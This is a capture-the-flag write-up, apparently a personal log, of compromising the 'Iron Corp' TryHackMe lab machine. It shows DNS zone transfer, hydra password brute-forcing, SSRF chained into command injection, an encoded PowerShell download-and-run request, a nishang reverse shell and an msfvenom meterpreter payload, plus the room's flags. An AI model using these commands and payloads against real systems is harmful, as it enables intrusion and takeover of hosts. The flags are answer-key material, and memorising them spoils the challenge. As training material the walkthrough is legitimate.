----
Can you get access to Iron Corp's system?
----

![](https://i.imgur.com/jemtUtJ.jpg)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/69b68a762493df6acc244e2f71e6eaf3.jpeg)

### Task 1  Iron Corp

 Start Machine

Iron Corp suffered a security breach not long time ago.  

You have been chosen by Iron Corp to conduct a penetration test of their asset. They did system hardening and are expecting you not to be able to access their system.  

The asset in scope is: ironcorp.me

Note: Edit your config file and add ironcorp.me

Note 2: It might take around 5-7 minutes for the VM to fully boot, so please be patient.  

Happy hacking!  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.76.56 ironcorp.me

https://github.com/hash3liZer/Subrake

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ subrake -d google.com --wordlists /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ python3.10 -m subrake -h               

/usr/lib/python3/dist-packages/requests/__init__.py:109: RequestsDependencyWarning: urllib3 (1.26.12) or chardet (None)/charset_normalizer (3.0.1) doesn't match a supported version!
  warnings.warn(



  ██████  █    ██  ▄▄▄▄   ▄▄▄█████▓ ▄▄▄       ██▓███
▒██    ▒  ██  ▓██▒▓█████▄ ▓  ██▒ ▓▒▒████▄    ▓██░  ██▒
░ ▓██▄   ▓██  ▒██░▒██▒ ▄██▒ ▓██░ ▒░▒██  ▀█▄  ▓██░ ██▓▒
  ▒   ██▒▓▓█  ░██░▒██░█▀  ░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▄█▓▒ ▒
▒██████▒▒▒▒█████▓ ░▓█  ▀█▓  ▒██▒ ░  ▓█   ▓██▒▒██▒ ░  ░
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ░▒▓███▀▒  ▒ ░░    ▒▒   ▓▒█░▒▓▒░ ░  ░
░ ░▒  ░ ░░░▒░ ░ ░ ▒░▒   ░     ░      ▒   ▒▒ ░░▒ ░
░  ░  ░   ░░░ ░ ░  ░    ░   ░        ░   ▒   ░░
      ░     ░      ░                     ░  ░
                        ░

                               @hash3liZer \ @vareesha / @nabeeha

A Subdomain Takeover Assessment toolkit for Bug Bounty and Pentesters.

Options:
   Args               Description                                    Default
   -h, --help           Show this manual                             NONE
   -d, --domain         Target domain. Possible
                        example: [example.com]                       NONE
   -w, --wordlists      Wordlists containing subdomains
                        to test. Multiple wordlists can
                        be specified.                                NONE
   -t, --threads        Number of threads to spawn                    25
   -o, --output         Store final subdomains in a specified file   NONE
   -c, --csv            Store output results in CSV format           NONE
   -p, --ports          Comma-seperated list of ports to scan.       NONE
   -s, --skip-search    Search for subdomains Online from various
                        sites.                                       FALSE
       --skip-subcast   Skip the usage of subcast module             FALSE
       --only-sublister Use only Sublist3r for subdomain enumeration FALSE
       --skip-zone      Skip Zone takeover check                     FALSE
       --filter         Filter subdomains with same IP in CSV output FALSE
                        Helpful with larger scopes.
       --exclude-ips    Exclude specified IPs from the final results
                        Helpful in removing False Positives          NONE
       --version        Show version                                 NONE


https://github.com/erforschr/bruteforce-http-auth

┌──(witty㉿kali)-[~/Downloads/bruteforce-http-auth]
└─$ python3.10 bruteforce-http-auth.py 
/usr/lib/python3/dist-packages/requests/__init__.py:109: RequestsDependencyWarning: urllib3 (1.26.12) or chardet (None)/charset_normalizer (3.0.1) doesn't match a supported version!
  warnings.warn(
[16-55-08] --------------------------
[16-55-08] ~  Bruteforce HTTP Auth  ~
[16-55-08] --------------------------
[16-55-08] 
usage: bruteforce-http-auth.py [-h] (-t TARGET | -T TARGETFILE) (-u USERNAME | -U USERNAMESFILE)
                               [-p PASSWORD | -P PASSWORDSFILE] [-w WORKERS] [-o ORDER] [-v]
bruteforce-http-auth.py: error: one of the arguments -t/--target -T/--targetfile is required


┌──(witty㉿kali)-[~/Downloads/bruteforce-http-auth]
└─$ rustscan -a ironcorp.me --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.76.56:53
Open 10.10.76.56:135
Open 10.10.76.56:3389
Open 10.10.76.56:8080
Open 10.10.76.56:11025
Open 10.10.76.56:49668
Open 10.10.76.56:49670
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 16:44 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:44
Completed NSE at 16:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:44
Completed NSE at 16:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:44
Completed NSE at 16:44, 0.00s elapsed
Initiating Connect Scan at 16:44
Scanning ironcorp.me (10.10.76.56) [7 ports]
Discovered open port 53/tcp on 10.10.76.56
Discovered open port 135/tcp on 10.10.76.56
Discovered open port 3389/tcp on 10.10.76.56
Discovered open port 8080/tcp on 10.10.76.56
Discovered open port 49668/tcp on 10.10.76.56
Discovered open port 49670/tcp on 10.10.76.56
Discovered open port 11025/tcp on 10.10.76.56
Completed Connect Scan at 16:44, 0.39s elapsed (7 total ports)
Initiating Service scan at 16:44
Scanning 7 services on ironcorp.me (10.10.76.56)
Completed Service scan at 16:45, 57.64s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.76.56.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:45
Completed NSE at 16:45, 8.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:45
Completed NSE at 16:45, 1.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:45
Completed NSE at 16:45, 0.02s elapsed
Nmap scan report for ironcorp.me (10.10.76.56)
Host is up, received user-set (0.38s latency).
Scanned at 2023-07-22 16:44:34 EDT for 69s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Issuer: commonName=WIN-8VMBKF3G815
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-21T20:25:53
| Not valid after:  2024-01-20T20:25:53
| MD5:   e0286aefdd6098b81c2392188c0db8f9
| SHA-1: 3bae00329345ac6d3deed47b04248ed1b59174dd
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQdfGC+AGV2odMxCzojbOTijANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwHhcNMjMwNzIxMjAyNTUzWhcNMjQw
| MTIwMjAyNTUzWjAaMRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC6DAArc0twKwnEEaX67jX+zc1wDLN+zVIE
| q4dHEXcv0pH5pNpCrjRVkUSQG5iaTlz6U05+jhREP84SQms1iVUFEHs+p872t7TT
| 7mzLsSjBHzENKiqEY3IwZzb1sBGReEYEAIwBiVqZArZl1L4h35Ee76RZxcPYIgWZ
| p5bwU+oiIGKYOs2acxkcOUkDmzHPCZjDhUjb9ukVMeg46uFZvq7zpjfrnZ+bnBvb
| tdOrsGNkhSHBpo2tGtx/t/k/tT6xe7EQ8j8j6Cam+x7xxV+SayG0QGGcVHokcXTX
| bA3uDh1+wi2ljO0mSpZ7TiV8aoug5ZZt3eEB+D6LfdVbRFzhdE9RAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAKHgdF6qtyfeoaOiHukA/Ir9BmwgaeahbDYy90JeCyc+G54fU8pVyL2R0
| ZOdHrgnuQtM1op7uGmnlOL9hlOBZqwtN5NLdd6tj+PrcK18i96gM3SBV2ixvdXmR
| yzjq+KpvJkXl0lgTH+Caz+PU8frogc1DohKSCqhAjPKjAdltmpp38w/IpibFTZij
| JtQ9Huv/qnBE7KymzocON9xm3GcX/R0RLSsjIKYcXfRtj/H354vHDe+tuyMwolzG
| LhI8ZhBFoODhHXr9L76HdHui/IUkzlkVNxXiV7un5W72AYT5/MQDXrAUNXtPXEUx
| GIDcmf0f/U2uo64zXhFKQaSHWeXRNQ==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2023-07-22T20:45:36+00:00
|_ssl-date: 2023-07-22T20:45:44+00:00; +2s from scanner time.
8080/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
11025/tcp open  http          syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:45
Completed NSE at 16:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:45
Completed NSE at 16:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:45
Completed NSE at 16:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.59 seconds

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ python3.10 -m subrake -d ironcorp.me --wordlists /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
/usr/lib/python3/dist-packages/requests/__init__.py:109: RequestsDependencyWarning: urllib3 (1.26.12) or chardet (None)/charset_normalizer (3.0.1) doesn't match a supported version!
  warnings.warn(



  ██████  █    ██  ▄▄▄▄   ▄▄▄█████▓ ▄▄▄       ██▓███
▒██    ▒  ██  ▓██▒▓█████▄ ▓  ██▒ ▓▒▒████▄    ▓██░  ██▒
░ ▓██▄   ▓██  ▒██░▒██▒ ▄██▒ ▓██░ ▒░▒██  ▀█▄  ▓██░ ██▓▒
  ▒   ██▒▓▓█  ░██░▒██░█▀  ░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▄█▓▒ ▒
▒██████▒▒▒▒█████▓ ░▓█  ▀█▓  ▒██▒ ░  ▓█   ▓██▒▒██▒ ░  ░
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ░▒▓███▀▒  ▒ ░░    ▒▒   ▓▒█░▒▓▒░ ░  ░
░ ░▒  ░ ░░░▒░ ░ ░ ▒░▒   ░     ░      ▒   ▒▒ ░░▒ ░
░  ░  ░   ░░░ ░ ░  ░    ░   ░        ░   ▒   ░░
      ░     ░      ░                     ░  ░
                        ░

                               @hash3liZer \ @vareesha / @nabeeha

[>] Wordlist Loaded: 100000
[>] CREATED ENVIRONMENT. EVERYTHING IN PLACE
[>] DNS Records ->

/home/witty/Downloads/Subrake/subrake/__main__.py:104: DeprecationWarning: please use dns.resolver.resolve() instead
  _ret = resolver.query(_dm, _type)

[>] Nothing found in records for the domain. Exiting!

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ dig 10.10.76.56                                   

; <<>> DiG 9.18.12-1-Debian <<>> 10.10.76.56
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 53781
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 512
;; QUESTION SECTION:
;10.10.76.56.			IN	A

;; AUTHORITY SECTION:
.			5	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2023072201 1800 900 604800 86400

;; Query time: 19 msec
;; SERVER: 192.168.253.2#53(192.168.253.2) (UDP)
;; WHEN: Sat Jul 22 17:20:26 EDT 2023
;; MSG SIZE  rcvd: 115

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ dig 10.10.76.56 axfr

; <<>> DiG 9.18.12-1-Debian <<>> 10.10.76.56 axfr
;; global options: +cmd
; Transfer failed.
                                                                                                                           
┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ dig axfr ironcorp.me

; <<>> DiG 9.18.12-1-Debian <<>> axfr ironcorp.me
;; global options: +cmd
; Transfer failed.


┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ dig axfr ironcorp.me @10.10.76.56

; <<>> DiG 9.18.12-1-Debian <<>> axfr ironcorp.me @10.10.76.56
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 1504 msec
;; SERVER: 10.10.76.56#53(10.10.76.56) (TCP)
;; WHEN: Sat Jul 22 17:22:49 EDT 2023
;; XFR size: 5 records (messages 1, bytes 238)

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ tac /etc/hosts
10.10.76.56 ironcorp.me admin.ironcorp.me internal.ironcorp.me

http://internal.ironcorp.me:11025/

http://admin.ironcorp.me:11025/ need creds

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ hydra -h                                                                               
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 11025 -f admin.ironcorp.me http-get -t 64           
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-22 17:42:58
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://admin.ironcorp.me:11025/
[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
[STATUS] attack finished for admin.ironcorp.me (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-22 17:43:47

http://admin.ironcorp.me:11025/?r=hi#

ssrf 

http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/

http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi

My name is:

	Equinoxhi

Command Injection and RCE

using burp

GET /?r=http://internal.ironcorp.me:11025/name.php?name=hi|whoami HTTP/1.1

My name is: </b><pre>
	nt authority\system

using nishang

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/samratashok/nishang.git           
Cloning into 'nishang'...
remote: Enumerating objects: 1705, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 1705 (delta 5), reused 8 (delta 2), pack-reused 1691
Receiving objects: 100% (1705/1705), 10.89 MiB | 4.94 MiB/s, done.
Resolving deltas: 100% (1064/1064), done.
                                                                                                                           
┌──(witty㉿kali)-[~/Downloads]
└─$ cd nishang 
                                                                                                                           
┌──(witty㉿kali)-[~/Downloads/nishang]
└─$ ls
ActiveDirectory  Bypass         DISCLAIMER.txt  Gather   MITM          powerpreter  Scan
Antak-WebShell   CHANGELOG.txt  Escalation      LICENSE  nishang.psm1  Prasadhak    Shells
Backdoors        Client         Execution       Misc     Pivot         README.md    Utility
                                                                                                                           
┌──(witty㉿kali)-[~/Downloads/nishang]
└─$ cd Shells 
                                                                                                                           
┌──(witty㉿kali)-[~/Downloads/nishang/Shells]
└─$ ls
Invoke-ConPtyShell.ps1  Invoke-PoshRatHttps.ps1              Invoke-PowerShellTcp.ps1         Invoke-PsGcatAgent.ps1
Invoke-JSRatRegsvr.ps1  Invoke-PowerShellIcmp.ps1            Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcat.ps1
Invoke-JSRatRundll.ps1  Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdp.ps1         Remove-PoshRat.ps1
Invoke-PoshRatHttp.ps1  Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellWmi.ps1

add your vpn ip and port 

┌──(witty㉿kali)-[~/Downloads/nishang/Shells]
└─$ tail Invoke-PowerShellTcp.ps1 
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.8.19.103 -Port 1337 

double url encode
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.8.19.103/Invoke-PowerShellTcp.ps1')

%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%39%25%32%65%25%33%31%25%33%30%25%33%33%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39

GET /?r=http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%39%25%32%65%25%33%31%25%33%30%25%33%33%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39 HTTP/1.1

┌──(witty㉿kali)-[~/Downloads/nishang/Shells]
└─$ python3 -m http.server 80                 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.40.206 - - [22/Jul/2023 17:57:26] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.40.206] 49981
Windows PowerShell running as user WIN-8VMBKF3G815$ on WIN-8VMBKF3G815
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS E:\xampp\htdocs\internal>whoami
nt authority\system

PS E:\xampp\htdocs\internal> cd c:\users
PS C:\users> ls


    Directory: C:\users


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        4/11/2020   4:41 AM                Admin                         
d-----        4/11/2020  11:07 AM                Administrator                 
d-----        4/11/2020  11:55 AM                Equinox                       
d-r---        4/11/2020  10:34 AM                Public                        
d-----        4/11/2020  11:56 AM                Sunlight                      
d-----        4/11/2020  11:53 AM                SuperAdmin                    
d-----        4/11/2020   3:00 AM                TEMP                          


PS C:\users> cd Administrator
PS C:\users\Administrator> ls


    Directory: C:\users\Administrator


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        4/12/2020   1:27 AM                Contacts                      
d-r---        4/12/2020   1:27 AM                Desktop                       
d-r---        4/12/2020   1:27 AM                Documents                     
d-r---        4/12/2020   1:27 AM                Downloads                     
d-r---        4/12/2020   1:27 AM                Favorites                     
d-r---        4/12/2020   1:27 AM                Links                         
d-r---        4/12/2020   1:27 AM                Music                         
d-r---        4/12/2020   1:27 AM                Pictures                      
d-r---        4/12/2020   1:27 AM                Saved Games                   
d-r---        4/12/2020   1:27 AM                Searches                      
d-r---        4/12/2020   1:27 AM                Videos                        


PS C:\users\Administrator> cd Desktop
PS C:\users\Administrator\Desktop> ls


    Directory: C:\users\Administrator\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/28/2020  12:39 PM             37 user.txt                      


PS C:\users\Administrator\Desktop> cat user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}

PS C:\users\Equinox\Desktop> dir -force


    Directory: C:\users\Equinox\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a-hs-        4/11/2020  11:55 AM            282 desktop.ini  

PS C:\users\admin> ls -force
PS C:\users\admin> ls : Access to the path 'C:\users\admin' is denied.
At line:1 char:1
+ ls -force
+ ~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\users\admin:String) [Get-C 
   hildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
   Commands.GetChildItemCommand

PS C:\users\SuperAdmin> ls : Access to the path 'C:\users\SuperAdmin' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\users\SuperAdmin:String) [ 
   Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
   Commands.GetChildItemCommand
 

PS C:\users\SuperAdmin> cat C:\users\SuperAdmin\Desktop\root.txt
thm{a1f936a086b367761cc4e7dd6cd2e2bd}

PS C:\users\SuperAdmin> get-acl C:\users\SuperAdmin


    Directory: C:\users


Path       Owner               Access                                          
----       -----               ------                                          
SuperAdmin NT AUTHORITY\SYSTEM BUILTIN\Administrators Deny  FullControl...     


PS C:\users\SuperAdmin> get-acl C:\users\SuperAdmin |fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\SuperAdmin
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Deny  FullControl
         S-1-5-21-297466380-2647629429-287235700-1000 Allow  FullControl
Audit  : 
Sddl   : O:SYG:SYD:PAI(D;OICI;FA;;;BA)(A;OICI;FA;;;S-1-5-21-297466380-264762942
         9-287235700-1000)

https://blog.didierstevens.com/2017/08/16/generating-powershell-scripts-with-msfvenom-on-windows/

https://www.puckiestyle.nl/meterpreter-reverse-shell-with-powershell/

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.8.19.103; set lport 1338; set ExitOnSession false; exploit -j"

┌──(witty㉿kali)-[~/Downloads]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.19.103 LPORT=1338 -f psh -o meterpreter-64.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3266 bytes
Saved as: meterpreter-64.ps1


PS C:\users\SuperAdmin> powershell -command "& { iwr 10.8.19.103/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }"

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.40.206 - - [22/Jul/2023 18:23:03] "GET /meterpreter-64.ps1 HTTP/1.1" 200 -

PS C:\users\SuperAdmin> cd C:\Users\Administrator\Desktop\
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        7/22/2023   3:23 PM           3266 meterpreter-64.ps1            
-a----        3/28/2020  12:39 PM             37 user.txt    

PS C:\Users\Administrator\Desktop> Import-Module .\meterpreter-64.ps1
1700

┌──(witty㉿kali)-[~/Downloads/Subrake]
└─$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.8.19.103; set lport 1338; set ExitOnSession false; exploit -j"
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
